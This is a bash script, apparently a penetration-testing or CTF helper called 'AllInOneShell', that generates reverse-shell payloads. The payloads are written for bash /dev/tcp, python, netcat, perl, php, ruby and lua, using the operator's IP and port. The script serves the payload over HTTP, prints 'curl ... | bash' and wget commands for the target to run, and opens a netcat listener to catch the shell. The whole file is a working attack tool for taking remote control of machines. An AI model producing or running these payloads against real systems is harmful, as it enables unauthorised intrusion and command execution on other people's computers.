#!/bin/bash
# Reverse Shell Generator by Mercury

# Colours:
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
BLUE="${C}[1;34m"
YELLOW="${C}[1;33m"
LIGHT_GREY="${C}[1;37m"
NC="${C}[0m"
UNDERLINED="${C}[4m"

# Config Items
http_port=80
http_timeout=300

# Banner:
function print_banner(){
	banner='		 __                   __             __              __        
                / /\                 /\ \           /\ \            / /\      
               / /  \                \ \ \         /  \ \          / /  \     
              / / /\ \               /\ \_\       / /\ \ \        / / /\ \__  
             / / /\ \ \             / /\/_/      / / /\ \ \      / / /\ \___\ 
            / / /  \ \ \           / / /        / / /  \ \_\     \ \ \ \/___/ 
           / / /___/ /\ \         / / /        / / /   / / /      \ \ \       
          / / /_____/ /\ \       / / /        / / /   / / /   _    \ \ \      
         / /_________/\ \ \  ___/ / /__      / / /___/ / /   /_/\__/ / /      
        / / /_       __\ \_\/\__\/_/___\    / / /____\/ /    \ \/___/ /       
        \_\___\     /____/_/\/_________/    \/_________/      \_____\/        
                                                                              '
    echo "$LIGHT_GREY$banner$NC"
	printf $RED"			AllInOneShell"$NC$YELLOW" - by Mercury#6286 \n"$NC
	printf "\n"
}

cmd='
if command -v bash >/dev/null 2>&1; then
	/bin/bash -i >& /dev/tcp/IP_REPLACE/PORT_REPLACE 0>&1
	exit;
elif command -v python >/dev/null 2>&1; then
	python -c '\''import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP_REPLACE",PORT_REPLACE)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'\''
	exit;
elif command -v python3 >/dev/null 2>&1; then
	python3 -c '\''import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP_REPLACE",PORT_REPLACE)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'\''
	exit;
elif command -v nc >/dev/null 2>&1; then
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_REPLACE PORT_REPLACE >/tmp/f
	exit;
elif command -v perl >/dev/null 2>&1; then
	perl -e '\''use Socket;$i="IP_REPLACE";$p=PORT_REPLACE;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\''
	exit;
elif command -v sh >/dev/null 2>&1; then
	/bin/sh -i >& /dev/tcp/IP_REPLACE/PORT_REPLACE 0>&1
	exit;
elif command -v php >/dev/null 2>&1; then
	php -r '\''$sock=fsockopen("IP_REPLACE",PORT_REPLACE);exec("/bin/sh -i <&3 >&3 2>&3");'\''
	exit;
elif command -v ruby >/dev/null 2>&1; then
	ruby -rsocket -e '\''f=TCPSocket.open("IP_REPLACE",PORT_REPLACE).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'\''
	exit;
elif command -v lua >/dev/null 2>&1; then
	lua -e '\''require("socket");require("os");t=socket.tcp();t:connect("IP_REPLACE","PORT_REPLACE");os.execute("/bin/sh -i <&3 >&3 2>&3");'\''
	exit;
else
	echo "No programs installed!" > /dev/tcp/IP_REPLACE/PORT_REPLACE
fi
'

print_banner

# Initalise Local IP/Port
IP=$1
PORT=$2

# From input:
get_ip(){
	echo -n "Enter IP: "
	read IP
}

get_port(){
	echo -n "Enter Port: "
	read PORT
}

# From args:
if [ "$IP" ]; then
	echo -n ""
else
	if [[ $(ifconfig tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | wc -c) -eq 0 ]]; then
		get_ip;
	else
		echo $BLUE"[*]"$NC" VPN connection found: using tun0 as address"
		IP=$(ifconfig tun0 2>/dev/null | grep 'inet ' | awk '{print $2}')
	fi
fi

if [ "$PORT" ]; then
	echo -n ""
else
	get_port;
fi

printf $LIGHT_GREY"[*]"$NC" IP: $IP\n"
printf $LIGHT_GREY"[*]"$NC" PORT: $PORT\n"
echo ""

# Add capabilities to netcat and python, if not found.
if [[ -v $(getcap $(readlink -f /usr/bin/nc) >/dev/null 2>&1) ]]; then 
	setcap 'CAP_NET_BIND_SERVICE+ep' $(readlink -f /usr/bin/nc)
	echo $BLUE"[*] "$NC"Added network capabilities to netcat"
fi

if [[ -v $(getcap $(readlink -f /usr/bin/python3) >/dev/null 2>&1) ]]; then
	setcap 'CAP_NET_BIND_SERVICE+ep' $(readlink -f /usr/bin/python3)
	echo $BLUE"[*] "$NC"Added network capabilities to python3"
fi

# Enable sudo if port is <1000
if [ $PORT -lt 1000 ]; then
	sudo="sudo";
	if [[ -v $(getcap $(readlink -f /usr/bin/nc) >/dev/null) ]]; then 
		echo $BLUE"[*] "$NC"Port under 1000 has been chosen, sudo is required"
	else
		echo $BLUE"[*] "$NC"Capabilities found - no need for sudo."
		echo
	fi
else
	echo -n "";
fi



# Socat Listener - Fixed!
socat_listen="exec socat TCP-L:$PORT FILE:`tty`,raw,echo=0"

### Listener Functions

function use_socat(){
    if [ $(which socat) ]; then
    	echo $RED"[*] "$NC"Socat listener started on port $PORT"
    	exec $socat_listen
    else
    	printf $LIGHT_GREY"[=]"$NC" Socat is not installed on the system!\n"
    fi
}

function use_netcat(){
    if [ $(which nc) ]; then
    	echo $LIGHT_GREY"[*] "$NC"Netcat listener started on port $PORT"
    	exec nc -lvnp $PORT
    else
    	printf $LIGHT_GREY"[=]"$NC" Netcat is not installed on the system!\n"
    fi
}

cmd=$(echo "$cmd" | sed -e "s/IP_REPLACE/$IP/g" | sed -e "s/PORT_REPLACE/$PORT/g")

function rev_file(){
	export tmp_dir=$(mktemp -d)
	echo "$cmd" > "$tmp_dir/shell.sh"
	echo $BLUE"[*] "$NC"Generated revshell file: $tmp_dir/shell.sh"
	echo
	
}

function http_server(){
	# Uses wget's option to write to stdout, so nothing is stored in memory ;\)
	curl_cmd=$(echo "curl http://$IP:$http_port/shell.sh | bash" | sed -e "s/:80\//\//g")
	wget_cmd=$(echo "wget -O - http://$IP:$http_port/shell.bash" | sed -e "s/:80\//\//g")
	echo $RED"[*] "$NC"Execute reverse shell:"
	echo "$curl_cmd"
	echo "$wget_cmd"
	echo
	echo $LIGHT_GREY"[*] "$NC"HTTP Server started in background"
	timeout -k 9 $http_timeout python3 -m http.server $http_port --directory $1 &
	sleep 1.5
	echo
}

function kill_servers(){
	other_servers=$(ps faux | grep "python3 -m http.server $http_port" | grep -v "grep ")
	pid=$(echo "$other_servers" | awk '{print $2}')
	if [[ $(echo -n "$other_servers" | wc -c) -gt 0 ]]; then
		echo $RED"[*] "$NC"Killed HTTP server running on the same port"
		kill -9 ${pid}
	fi
	echo
}

kill_servers
rev_file
http_server $tmp_dir
use_netcat